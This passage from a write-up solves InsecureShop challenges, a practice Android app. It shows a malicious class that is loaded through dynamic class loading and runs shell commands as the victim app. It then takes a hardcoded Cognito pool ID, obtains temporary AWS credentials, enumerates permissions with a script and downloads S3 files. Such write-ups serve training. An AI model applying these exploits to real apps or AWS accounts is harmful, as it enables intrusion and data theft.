</pre></table></code></div></div><p>As the article describes, In this example, the vulnerable app obtains the ClassLoader of any app whose package begins with <code class="language-plaintext highlighter-rouge">com.insecureshopapp</code> and tries to find <code class="language-plaintext highlighter-rouge">com.insecureshopapp.MainInterface</code> and call its <code class="language-plaintext highlighter-rouge">getInterface</code> method. The danger is that an attacker can create their own app with a package name that begins with the right prefix, create the specified class with this method, and include in that method code that will then be executed in the context of the victim app. Let’s create our own app to exploit this vulnerability.</p><p>Let’s create a new project in Android Studio with the package name that begins with <code class="language-plaintext highlighter-rouge">com.insecureshopapp</code> to trigger the exploit:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2021.png" alt="image.png" /></p><p>Then create a new class called <code class="language-plaintext highlighter-rouge">MainInterface</code> to trigger the exploit:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.insecureshopapp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">android.content.Context</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">android.util.Log</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">android.widget.Toast</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainInterface</span> <span class="o">{</span>
<span class="kd">public</span> <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">getInstance</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Malicious code to be executed</span>
    <span class="nc">StringBuilder</span> <span class="n">output</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
    <span class="k">try</span> <span class="o">{</span> 
        <span class="nc">ProcessBuilder</span> <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ProcessBuilder</span><span class="o">(</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="s">"whoami;ls /data/data/com.insecureshop/"</span><span class="o">);</span>
        <span class="nc">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="n">processBuilder</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
        <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">output</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">process</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"MainInterface"</span><span class="o">,</span> <span class="s">"Command Output: "</span> <span class="o">+</span> <span class="n">output</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Build and Install the APK:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">D:\</span><span class="err">&gt;</span><span class="nx">adb</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">DynamicClassLoadingExploit.apk</span><span class="w">
</span><span class="n">Performing</span><span class="w"> </span><span class="nx">Push</span><span class="w"> </span><span class="nx">Install</span><span class="w"> 
</span><span class="n">DynamicClassLoadingExploit.apk:</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">pushed</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">skipped.</span><span class="w"> </span><span class="nx">206.0</span><span class="w"> </span><span class="nx">MB/s</span><span class="w"> </span><span class="p">(</span><span class="mi">5256157</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">0.024s</span><span class="p">)</span><span class="w">
        </span><span class="n">pkg:</span><span class="w"> </span><span class="nx">/data/local/tmp/DynamicClassLoadingExploit.apk</span><span class="w">
</span><span class="n">Success</span><span class="w">
</span></pre></table></code></div></div><p>We need to make sure that we are running commands with the permissions of the vulnerable app, not our exploit app. So let’s get our app ID.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">D:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">generic_x86:/</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">/data/data/com.insecureshop</span><span class="w">
</span><span class="n">u0_a61</span><span class="err">@</span><span class="nx">generic_x86:/data/data/com.insecureshop</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">ls</span><span class="w">
</span><span class="n">drwxrwx--x</span><span class="w"> </span><span class="nx">u0_a61</span><span class="w">   </span><span class="nx">u0_a61</span><span class="w">            </span><span class="nx">2024-08-26</span><span class="w"> </span><span class="nx">15:15</span><span class="w"> </span><span class="nx">app_webview</span><span class="w">
</span><span class="n">drwxrwx--x</span><span class="w"> </span><span class="nx">u0_a61</span><span class="w">   </span><span class="nx">u0_a61</span><span class="w">            </span><span class="nx">2024-08-28</span><span class="w"> </span><span class="nx">19:47</span><span class="w"> </span><span class="nx">cache</span><span class="w">
</span><span class="n">drwxrwx--x</span><span class="w"> </span><span class="nx">u0_a61</span><span class="w">   </span><span class="nx">u0_a61</span><span class="w">            </span><span class="nx">2024-08-26</span><span class="w"> </span><span class="nx">13:49</span><span class="w"> </span><span class="nx">code_cache</span><span class="w">
</span><span class="n">drwxrwx--x</span><span class="w"> </span><span class="nx">u0_a61</span><span class="w">   </span><span class="nx">u0_a61</span><span class="w">            </span><span class="nx">2024-08-28</span><span class="w"> </span><span class="nx">18:45</span><span class="w"> </span><span class="nx">shared_prefs</span><span class="w">
</span></pre></table></code></div></div><p>Finally, we open the Insecureshop app into the <code class="language-plaintext highlighter-rouge">loginActivity</code> to trigger the exploit and click login. Then review the logs:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="nx">generic_x86:/data/data/com.insecureshop</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">logcat</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s2">"MainInterface"</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2022.png" alt="image.png" /></p><p>The exploit worked, and we ran the <code class="language-plaintext highlighter-rouge">whoami</code> command with the Insecureshop app ID and were able to list its directory.</p><h2 id="aws-cognito-misconfiguration"><strong>AWS Cognito Misconfiguration</strong></h2><blockquote><p><strong>Description:</strong> InsecureShop application implements misconfigured AWS Cognito instance that can be used to access AWS S3 bucket. Can you find the content or access files within the S3 bucket? If you can solve this one, you’ll get a V-Cola :) 🍺</p></blockquote><p>As I don’t know anything about the AWS cognito, I have followed this article to help solve this challenge:</p><p><a href="https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963">Exploiting weak configurations in Amazon Cognito in AWS</a></p><p>Let’s give a quick introduction to the AWS cognito:</p><p>AWS Cognito is an Amazon Web Service that provides authentication, authorization, and user management for web and mobile apps. It allows developers to add sign-in and sign-up functionality to their applications, handle user sessions, and manage permissions across AWS services. Cognito offers two main components:</p><ol><li><strong>User Pools</strong>: Manage user authentication and provide features like MFA and password recovery.<li><strong>Identity Pools</strong>: Grant temporary access to AWS resources like S3, DynamoDB, etc., using either authenticated or unauthenticated identities.</ol><p>At the beginning, I searched for the hardcoded credentials with <code class="language-plaintext highlighter-rouge">Jadx-gui</code> and it was embedded in the strings.xml file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>us-east-1:7e9426f7-******-8689-00a9a4b65c1c
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2023.png" alt="image.png" /></p><p>So what we have is an <code class="language-plaintext highlighter-rouge">aws_Identity_pool_ID</code> we can use it to get temporary access to AWS resources. Let’s use the <code class="language-plaintext highlighter-rouge">aws-cli</code> for that:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c"># Getting the Identity ID</span>
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>aws cognito-identity get-id <span class="nt">--identity-pool-id</span> us-east-1:7e9426f7-<span class="k">*****</span>8689-00a9a4b65c1c <span class="nt">--region</span> us-east-1 
<span class="o">{</span>
    <span class="s2">"IdentityId"</span>: <span class="s2">"us-east-1:15f0125a-*****-4f0a-43cd212fed35"</span>
<span class="o">}</span>
 
<span class="c"># Getting temporary creds                        </span>
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>aws cognito-identity get-credentials-for-identity <span class="nt">--identity-id</span> us-east-1:15f0125a-<span class="k">*****</span><span class="nt">-4f0a-43cd212fed35</span> <span class="nt">--region</span> us-east-1
<span class="o">{</span>
    <span class="s2">"IdentityId"</span>: <span class="s2">"us-east-1:15f0125a-1ff0-*****-43cd212fed35"</span>,
    <span class="s2">"Credentials"</span>: <span class="o">{</span>
        <span class="s2">"AccessKeyId"</span>: <span class="s2">"ASIARL4*****HNH6"</span>,
        <span class="s2">"SecretKey"</span>: <span class="s2">"oOerEL*****ATBYkFC1IILP9aJN5k"</span>,
        <span class="s2">"SessionToken"</span>: <span class="s2">"IQoJb3JpZ2luX2VjENf//////////wEaCXVzLWVhc3QtMSJHMEUCIQCRAYtyg6oD/*****"</span>,
        <span class="s2">"Expiration"</span>: <span class="s2">"2024-09-05T18:43:37+03:00"</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>So now we have a temporary credential. But we need to know what we can use these credentials for? As explained in the mentioned blog post, we can use the <strong>enumerate-iam</strong> tool for that. Let’s install it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt]
└─<span class="nv">$ </span>git clone https://github.com/andresriancho/enumerate-iam.git

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>pip3 <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>python3 enumerate-iam.py <span class="nt">--access-key</span> ASIARL<span class="k">*****</span>Q57WJBZK <span class="nt">--secret-key</span> zMCS+52lj8PfUUTwk<span class="k">*****</span>p2osMt1R 
</pre></table></code></div></div><p>Unfortunately the command was stuck after running, and my thinking is that the session token is being expired, so I had to create a script to automate this process.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">run_aws_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">stdout</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error running command: </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">run_and_stream_output</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">log_file</span> <span class="o">=</span> <span class="sh">"</span><span class="s">output.log</span><span class="sh">"</span>
    
    <span class="c1"># Run the command and redirect output to a file
</span>    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s"> &gt; </span><span class="si">{</span><span class="n">log_file</span><span class="si">}</span><span class="s"> 2&gt;&amp;1 &amp;</span><span class="sh">"</span><span class="p">)</span>

    <span class="c1"># Monitor the log file and print new content as it is added
</span>    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
                <span class="c1"># No more content, wait for a bit before checking again
</span>                <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
                <span class="k">continue</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
            <span class="c1"># Break the loop when the process finishes
</span>            <span class="k">if</span> <span class="n">f</span><span class="p">.</span><span class="nf">tell</span><span class="p">()</span> <span class="o">==</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">getsize</span><span class="p">(</span><span class="n">log_file</span><span class="p">):</span>
                <span class="k">break</span>

<span class="k">def</span> <span class="nf">update_aws_credentials</span><span class="p">(</span><span class="n">access_key</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">session_token</span><span class="p">):</span>
    <span class="n">aws_credentials_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">expanduser</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/.aws/credentials</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">aws_credentials_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[iam]</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">aws_access_key_id = </span><span class="si">{</span><span class="n">access_key</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">aws_secret_access_key = </span><span class="si">{</span><span class="n">secret_key</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">aws_session_token = </span><span class="si">{</span><span class="n">session_token</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Step 1: Get Identity ID
</span><span class="n">identity_pool_id</span> <span class="o">=</span> <span class="sh">"</span><span class="s">us-east-1:7e9426f7-42af-*****-8689-00a9a4b65c1c</span><span class="sh">"</span>
<span class="n">command1</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">aws</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">cognito-identity</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">get-id</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">--identity-pool-id</span><span class="sh">"</span><span class="p">,</span> <span class="n">identity_pool_id</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">--region</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">us-east-1</span><span class="sh">"</span>
<span class="p">]</span>
<span class="n">identity_output</span> <span class="o">=</span> <span class="nf">run_aws_command</span><span class="p">(</span><span class="n">command1</span><span class="p">)</span>

<span class="k">if</span> <span class="n">identity_output</span><span class="p">:</span>
    <span class="n">identity_id</span> <span class="o">=</span> <span class="n">identity_output</span><span class="p">[</span><span class="sh">'</span><span class="s">IdentityId</span><span class="sh">'</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Identity ID: </span><span class="si">{</span><span class="n">identity_id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="c1"># Step 2: Get Credentials for Identity
</span>    <span class="n">command2</span> <span class="o">=</span> <span class="p">[</span>
        <span class="sh">"</span><span class="s">aws</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">cognito-identity</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">get-credentials-for-identity</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">--identity-id</span><span class="sh">"</span><span class="p">,</span> <span class="n">identity_id</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">--region</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">us-east-1</span><span class="sh">"</span>
    <span class="p">]</span>
    <span class="n">credentials_output</span> <span class="o">=</span> <span class="nf">run_aws_command</span><span class="p">(</span><span class="n">command2</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">credentials_output</span><span class="p">:</span>
        <span class="n">access_key</span> <span class="o">=</span> <span class="n">credentials_output</span><span class="p">[</span><span class="sh">'</span><span class="s">Credentials</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">AccessKeyId</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">secret_key</span> <span class="o">=</span> <span class="n">credentials_output</span><span class="p">[</span><span class="sh">'</span><span class="s">Credentials</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">SecretKey</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">session_token</span> <span class="o">=</span> <span class="n">credentials_output</span><span class="p">[</span><span class="sh">'</span><span class="s">Credentials</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">SessionToken</span><span class="sh">'</span><span class="p">]</span>
        
        <span class="c1"># Step 3: Run the IAM enumeration script and stream output
</span>        <span class="n">command3</span> <span class="o">=</span> <span class="p">(</span>
            <span class="sh">"</span><span class="s">python3 enumerate-iam.py </span><span class="sh">"</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">--access-key </span><span class="si">{</span><span class="n">access_key</span><span class="si">}</span><span class="s"> </span><span class="sh">"</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">--secret-key </span><span class="si">{</span><span class="n">secret_key</span><span class="si">}</span><span class="s"> </span><span class="sh">"</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">--session-token </span><span class="si">{</span><span class="n">session_token</span><span class="si">}</span><span class="s"> </span><span class="sh">"</span>
            <span class="sh">"</span><span class="s">--region us-east-1</span><span class="sh">"</span>
        <span class="p">)</span>
        <span class="c1"># Step 4: Update AWS credentials
</span>        <span class="nf">update_aws_credentials</span><span class="p">(</span><span class="n">access_key</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span><span class="n">session_token</span><span class="p">)</span>
        <span class="nf">run_and_stream_output</span><span class="p">(</span><span class="n">command3</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to get credentials for identity.</span><span class="sh">"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to get identity.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Let’s explain what is doing:</p><ul><li>getting the Get Identity ID from the command  <code class="language-plaintext highlighter-rouge">aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-*****-8689-00a9a4b65c1c --region us-east-1</code><li>Passing it to the <code class="language-plaintext highlighter-rouge">aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-1ff0-*****-4f0a-43cd212fed35 --region us-east-1</code> command and get the session and access_key.<li>Then, pass all these info to the <code class="language-plaintext highlighter-rouge">enumerate-iam.py</code>tool and getting the output.</ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam] 
└─<span class="nv">$ </span>python3 exploit.py
2024-09-05 19:38:23,136 - 62112 - <span class="o">[</span>INFO] Starting permission enumeration <span class="k">for </span>access-key-id <span class="s2">"ASIARL4ASLIPYKJEFBIL"</span>
2024-09-05 19:38:24,436 - 62112 - <span class="o">[</span>INFO] <span class="nt">--</span> Account ARN : arn:aws:sts::094222047775:assumed-role/Cognito_InsecureshopUnauth_Role/CognitoIdentityCredentials
2024-09-05 19:38:24,436 - 62112 - <span class="o">[</span>INFO] <span class="nt">--</span> Account Id  : 094222047775
2024-09-05 19:38:24,436 - 62112 - <span class="o">[</span>INFO] <span class="nt">--</span> Account Path: assumed-role/Cognito_InsecureshopUnauth_Role/CognitoIdentityCredentials
2024-09-05 19:38:26,286 - 62112 - <span class="o">[</span>INFO] Attempting common-service describe / list brute force.
2024-09-05 19:38:28,041 - 62112 - <span class="o">[</span>INFO] <span class="nt">--</span> s3.list_buckets<span class="o">()</span> worked!
2024-09-05 19:38:33,659 - 62112 - <span class="o">[</span>INFO] <span class="nt">--</span> dynamodb.describe_endpoints<span class="o">()</span> worked!
2024-09-05 19:38:33,950 - 62112 - <span class="o">[</span>ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2024-09-05 19:38:36,357 - 62112 - <span class="o">[</span>ERROR] Remove codedeploy.list_deployment_targets action
2024-09-05 19:38:36,944 - 62112 - <span class="o">[</span>ERROR] Remove codedeploy.get_deployment_target action
2024-09-05 19:38:37,227 - 62112 - <span class="o">[</span>ERROR] Remove codedeploy.batch_get_deployment_targets action
</pre></table></code></div></div><ul><li>We Noticed that we have access to S3 buckets <code class="language-plaintext highlighter-rouge">s3.list_buckets()</code>.<li>So Our script will add all extracted information to the <code class="language-plaintext highlighter-rouge">/root/.aws/credentials</code> to create a profile with the name <code class="language-plaintext highlighter-rouge">iam</code> that will allow us to access the S3 buckets and use these sessions with further AWS commands.</ul><p>Let’s enumerate which buckets we have access to and then get the content of all of them:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam] 
└─<span class="nv">$ </span>aws s3 <span class="nb">ls</span> <span class="nt">--profile</span> iam   
2024-07-18 13:05:53 elasticbeanstalk-us-west-2-094222047733
2020-11-15 19:31:10 elasticbeanstalk-us-west-2-094222047775
2022-11-12 20:42:24 geolocation-pocfiles

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://elasticbeanstalk-us-west-2-094222047733 <span class="nt">--recursive</span> <span class="nt">--human-readable</span> <span class="nt">--summarize</span> <span class="nt">--profile</span> iam

Total Objects: 0
   Total Size: 0 Bytes
                        
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://elasticbeanstalk-us-west-2-094222047775 <span class="nt">--recursive</span> <span class="nt">--human-readable</span> <span class="nt">--summarize</span> <span class="nt">--profile</span> iam
2022-03-22 19:06:59    1.9 KiB Misconfiguration of Misconfiguration task lol - https://t.me/lasagnahowto , https://uvicorn.github.io &lt;- writeup here
2023-09-12 05:40:12    9 Bytes hainv15.txt
2023-07-18 20:56:23  279 Bytes pwned.txt

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://geolocation-pocfiles <span class="nt">--recursive</span> <span class="nt">--human-readable</span> <span class="nt">--summarize</span> <span class="nt">--profile</span> iam
2024-01-29 15:53:40   53 Bytes flag.txt
2022-11-12 20:43:53    1.0 KiB geo.html
2022-11-12 20:43:52  898 Bytes geo.js
</pre></table></code></div></div><p>It appears that <code class="language-plaintext highlighter-rouge">congratulations.txt</code> doesn’t exist, maybe it has been removed, as the bucket has edit access that can allow any user to remove or add files. But no worries, as we have already followed the same intended solution, we can just get the <code class="language-plaintext highlighter-rouge">flag.txt</code> file:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span> aws s3api get-object <span class="nt">--bucket</span> geolocation-pocfiles <span class="nt">--key</span> flag.txt flag.txt <span class="nt">--profile</span> iam

<span class="o">{</span>
<span class="s2">"AcceptRanges"</span>: <span class="s2">"bytes"</span>,
<span class="s2">"LastModified"</span>: <span class="s2">"2024-01-29T13:53:40+00:00"</span>,
<span class="s2">"ContentLength"</span>: 53,
<span class="s2">"ETag"</span>: <span class="s2">"</span><span class="se">\"</span><span class="s2">42d9cca424a87c68c3bf2cdaf96132a7</span><span class="se">\"</span><span class="s2">"</span>,
<span class="s2">"VersionId"</span>: <span class="s2">"a7nrRagqb8XxKXcIo6uCku0JFE7J9i9U"</span>,
<span class="s2">"ContentType"</span>: <span class="s2">"text/plain"</span>,
<span class="s2">"ServerSideEncryption"</span>: <span class="s2">"AES256"</span>,
<span class="s2">"Metadata"</span>: <span class="o">{}</span>
<span class="o">}</span>

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span><span class="nb">cat </span>flag.txt
FLAG<span class="o">{</span>dwaidiwadnaidnaubuybfreijjjjjjjinfniernniwnfin<span class="o">}</span>                        
